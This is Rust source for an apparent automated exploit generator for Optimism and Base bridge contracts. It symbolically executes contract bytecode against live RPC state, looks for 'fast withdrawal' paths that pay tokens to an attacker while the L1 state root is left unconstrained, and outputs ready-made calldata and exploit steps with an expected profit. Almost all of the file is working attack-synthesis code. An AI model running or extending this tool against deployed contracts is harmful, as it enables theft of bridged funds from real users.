/// Strategy: L2-Native Bridge Arbitrage (OP-Stack)
/// Detects SAT paths where a contract pays out a "fast withdrawal" while the L1 state-root
/// parameter remains non-uniquely constrained (missing/weak binding).
pub struct L2NativeBridgeArbitrageObjective {
    pub rpc_url: String,
    pub chain_id: u64,
}

fn has_push4(bytecode: &Bytes, selector: [u8; 4]) -> bool {
    let mut needle = [0u8; 5];
    needle[0] = 0x63; // PUSH4
    needle[1..].copy_from_slice(&selector);
    bytecode.as_ref().windows(5).any(|w| w == needle)
}

fn is_opstack_chain(chain_id: u64) -> bool {
    chain_id == 8453 || chain_id == 10
}

fn is_l2_fast_withdrawal_like(bytecode: &Bytes) -> bool {
    // Conservative surface: claim/withdraw entrypoints + token transfer surface.
    let has_claim_or_withdraw = has_push4(bytecode, crate::utils::selectors::CLAIM)
        || has_push4(bytecode, crate::utils::selectors::WITHDRAW);
    let has_token_transfer =
        has_push4(bytecode, crate::utils::selectors::TRANSFER)
            || has_push4(bytecode, crate::utils::selectors::TRANSFER_FROM);

    has_claim_or_withdraw && has_token_transfer
}

fn store_calldata_bytes<'ctx>(machine: &mut SymbolicMachine<'ctx>, offset: u64, bytes: &[u8]) {
    let base = machine.calldata.1.clone();
    let mut arr = machine.calldata.0.clone();
    for (i, b) in bytes.iter().enumerate() {
        let idx = base.bvadd(&BV::from_u64(machine.context, offset + i as u64, 256));
        let val = BV::from_u64(machine.context, *b as u64, 8);
        arr = arr.store(&idx, &val);
    }
    machine.calldata.0 = arr;
}

fn store_calldata_word<'ctx>(machine: &mut SymbolicMachine<'ctx>, offset: u64, word: &BV<'ctx>) {
    let base = machine.calldata.1.clone();
    let mut arr = machine.calldata.0.clone();
    for i in 0..32u64 {
        let shift = BV::from_u64(machine.context, (31u64 - i) * 8, 256);
        let byte = word.bvlshr(&shift).extract(7, 0); // BV<8>
        let idx = base.bvadd(&BV::from_u64(machine.context, offset + i, 256));
        arr = arr.store(&idx, &byte);
    }
    machine.calldata.0 = arr;
}

fn attacker_address_word(attacker: Address) -> [u8; 32] {
    let mut out = [0u8; 32];
    out[12..].copy_from_slice(attacker.as_slice());
    out
}

fn build_probe_calldata(
    selector: &[u8],
    root: U256,
    amount: U256,
    attacker: Address,
) -> Bytes {
    // Template: selector + 8 words
    // word0..word3: root (duplicated to cover common ABI positions)
    // word4..word5: attacker (duplicated)
    // word6..word7: amount (duplicated)
    let mut out = Vec::with_capacity(4 + 32 * 8);
    out.extend_from_slice(selector);
    for _ in 0..4 {
        out.extend_from_slice(&root.to_be_bytes::<32>());
    }
    let addr_word = attacker_address_word(attacker);
    out.extend_from_slice(&addr_word);
    out.extend_from_slice(&addr_word);
    out.extend_from_slice(&amount.to_be_bytes::<32>());
    out.extend_from_slice(&amount.to_be_bytes::<32>());
    Bytes::from(out)
}

#[derive(Clone)]
struct BridgeArbTrace<'ctx> {
    success_execution: bool,
    reverted: bool,
    transfer_events: Vec<TokenTransferEvent<'ctx>>,
}

fn execute_bridge_arbitrage_trace<'ctx>(
    solver: &'ctx Solver<'ctx>,
    scenario: &mut crate::solver::setup::StandardScenario<'ctx>,
    call_data: &Bytes,
    root_word: &BV<'ctx>,
    amount_word: &BV<'ctx>,
) -> BridgeArbTrace<'ctx> {
    let snapshot = scenario.machine.snapshot();
    let mut current_db = scenario.db.clone();
    solver.push();

    scenario.machine.reset_calldata();
    scenario.machine.tx_id += 1;
    scenario.machine.reverted = false;
    scenario.machine.token_transfer_events.clear();
    scenario.machine.fee_on_transfer_mode = false;

    // Bind symbolic calldata to a concrete ABI-like template to reduce replay drift.
    store_calldata_bytes(&mut scenario.machine, 0, &call_data[..4]);
    for i in 0..4u64 {
        store_calldata_word(&mut scenario.machine, 4 + 32 * i, root_word);
    }

    let attacker_word_bv = crate::symbolic::z3_ext::bv_from_u256(
        scenario.machine.context,
        U256::from_be_bytes(scenario.attacker.into_word().into()),
    );
    for i in 4..6u64 {
        store_calldata_word(&mut scenario.machine, 4 + 32 * i, &attacker_word_bv);
    }
    for i in 6..8u64 {
        store_calldata_word(&mut scenario.machine, 4 + 32 * i, amount_word);
    }

    let result;
    {
        // Concrete tx.data is only a length/carrier; symbolic execution reads `machine.calldata`.
        let tx_payload = build_probe_calldata(
            &call_data[..4],
            U256::ZERO,
            U256::ZERO,
            scenario.attacker,
        );
        let mut evm = Evm::builder()
            .with_db(&mut current_db)
            .with_external_context(&mut scenario.machine)
            .append_handler_register(revm::inspector_handle_register)
            .modify_tx_env(|tx| {
                tx.caller = scenario.attacker;
                tx.transact_to = TransactTo::Call(scenario.contract_addr);
                tx.data = tx_payload;
                tx.value = U256::ZERO;
                tx.gas_limit = 10_000_000;
            })
            .build();
        result = evm.transact_commit();
    }

    let success_execution = if let Ok(res) = result {
        matches!(res, revm::primitives::ExecutionResult::Success { .. })
    } else {
        false
    };

    let trace = BridgeArbTrace {
        success_execution,
        reverted: scenario.machine.reverted,
        transfer_events: scenario.machine.token_transfer_events.clone(),
    };

    scenario.machine.restore(&snapshot);
    solver.pop(1);
    trace
}

fn has_attacker_payout<'ctx>(
    ctx: &'ctx Context,
    solver: &'ctx Solver<'ctx>,
    contract_addr: Address,
    attacker: Address,
    trace: &BridgeArbTrace<'ctx>,
) -> bool {
    if trace.reverted || !trace.success_execution {
        return false;
    }

    // Look for modeled ERC20 transfer from contract to attacker with received > 0.
    for event in &trace.transfer_events {
        if event.from != contract_addr || event.to != attacker {
            continue;
        }
        solver.push();
        solver.assert(&event.received_amount.bvugt(&BV::from_u64(ctx, 0, 256)));
        let sat = solver.check() == z3::SatResult::Sat;
        solver.pop(1);
        if sat {
            return true;
        }
    }

    false
}

impl ExploitObjective for L2NativeBridgeArbitrageObjective {
    fn name(&self) -> &str {
        "L2 Bridge Root-Lag Withdrawal Risk"
    }

    fn execute(&self, bytecode: &Bytes) -> Option<ExploitParams> {
        if !is_opstack_chain(self.chain_id) {
            return None;
        }
        if !is_l2_fast_withdrawal_like(bytecode) {
            return None;
        }

        run_with_z3_solver(|ctx, solver| {
            let rpc_url = self.rpc_url.clone();
            let mut scenario = crate::solver::setup::StandardScenario::try_new(
                ctx,
                solver,
                &rpc_url,
                bytecode,
                "l2_bridge_arb_loan",
            )
            .ok()?;

            let mut selectors = crate::solver::setup::selectors_from_context_or_scan(bytecode);
            selectors.push(Bytes::from_static(&crate::utils::selectors::CLAIM));
            selectors.push(Bytes::from_static(&crate::utils::selectors::WITHDRAW));
            selectors.sort();
            selectors.dedup();
            if selectors.is_empty() {
                return None;
            }
            selectors.truncate(selectors.len().min(8));

            for call_data in &selectors {
                if call_data.len() < 4 {
                    continue;
                }

                let root_name = format!("l1_state_root_{}", scenario.machine.tx_id);
                let amount_name = format!("fast_withdraw_amount_{}", scenario.machine.tx_id);
                let root_word = BV::new_const(ctx, root_name.as_str(), 256);
                let amount_word = BV::new_const(ctx, amount_name.as_str(), 256);

                let trace = execute_bridge_arbitrage_trace(
                    solver,
                    &mut scenario,
                    call_data,
                    &root_word,
                    &amount_word,
                );

                if !has_attacker_payout(
                    ctx,
                    solver,
                    scenario.contract_addr,
                    scenario.attacker,
                    &trace,
                ) {
                    continue;
                }

                solver.push();
                if solver.check() != z3::SatResult::Sat {
                    solver.pop(1);
                    continue;
                }
                let model = solver.get_model()?;
                let root_eval = model.eval::<BV>(&root_word, true).and_then(|v| u256_from_bv(&v))?;
                let amount_eval = model
                    .eval::<BV>(&amount_word, true)
                    .and_then(|v| u256_from_bv(&v))
                    .unwrap_or(U256::from(1u64));

                // Root "not uniquely constrained" check: if we can force a different root and remain SAT,
                // the contract path is not binding the L1 root tightly (lag/missing check).
                let root_bv = crate::symbolic::z3_ext::bv_from_u256(ctx, root_eval);
                solver.assert(&root_word._eq(&root_bv).not());
                let root_non_unique = solver.check() == z3::SatResult::Sat;
                solver.pop(1);

                if !root_non_unique {
                    continue;
                }

                tracing::warn!(
                    "[L2BRIDGE] fast-withdraw payout with non-unique root: root={:#x} amount={:#x}",
                    root_eval,
                    amount_eval
                );

                return Some(ExploitParams {
                    flash_loan_amount: U256::ZERO,
                    flash_loan_token: Address::ZERO,
                    flash_loan_provider: Address::ZERO,
                                       flash_loan_legs: Vec::new(),
                    steps: vec![ExploitStep {
                        target: scenario.contract_addr,
                        call_data: build_probe_calldata(
                            &call_data[..4],
                            root_eval,
                            amount_eval,
                            scenario.attacker,
                        ),
                        execute_if: None,
                    }],
                    expected_profit: Some(U256::from(1u64)),
                    block_offsets: None,
                });
            }

            None
        })
    }
}
